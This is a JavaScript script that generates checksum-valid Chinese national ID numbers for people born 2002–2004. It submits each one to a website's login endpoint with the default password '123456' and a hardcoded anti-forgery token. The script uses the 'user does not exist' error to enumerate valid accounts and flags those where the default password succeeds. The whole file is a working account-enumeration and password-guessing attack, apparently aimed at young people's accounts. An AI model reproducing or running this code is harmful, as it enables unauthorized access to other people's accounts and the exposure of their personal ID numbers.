	var PSSD="123456";
	var data = [];
	
	var Presult = [];
	function IDCheck(personalID){
		var sum = 0;
		[7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2].forEach((weight, index) => {
			sum += +personalID[index] * weight;
		});
		return ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'][sum % 11] === personalID[17];
	}
	
	async function test(Pre,Lst){
		var i=2002,j=1,k=1,J='00',K='00',nw;
		while(1) {
			var res;
			J=(j<10)?'0'+j:j;
			K=(k<10)?'0'+k:k;
			nw=Pre+i+J+K+Lst;
			if(!IDCheck(nw)){
				if (++k > 31) {
					k=1;
					if (++j > 12) {
						j=1;
						if (++i > 2004) return null;
					}
				}
				continue;
			}
			try {
				res = await query("G"+nw, PSSD);
			} catch (err) {
				continue;
			}
			if (res.success) {
				return nw+'-sb';
			} else if(res.errorModel[0].Value !== "用户名不存在"){
				return nw;
			} else {
				if (++k > 31) {
					k=1;
					if (++j > 12) {
						j=1;
						if (++i > 2005) return null;
					}
				}
			}
		}
	}
	function query(username, password) {
		return new Promise(function(resolve, reject) {
			$.ajax({
				url: '/Home/Login?length=4',
				method: 'post',
				data: {
					__RequestVerificationToken: 'EHb2gFMeMHLHqyIomtNn6uLB6feIdfN4RIPX2d8h52fRhI100AixzEGJthtpIKANWwDxQTbfA2Xs7cuWXH9Nk8bU88Q1',
					HiddenPassword: password,
					AutoLogin: 'True',
					IsInputVerificationCode: 'true',
					UserName: username,
					Password: 'nihaolaoa'
				},
				dataType: 'json'
			}).done(resolve).fail(reject);
		});
	}
	data.slice(0, 1).forEach(function(val) {
		test(val[0], val[1]).then(function(data) {
			console.log("Ans:"+data);
			Presult.push(data);
		});
	});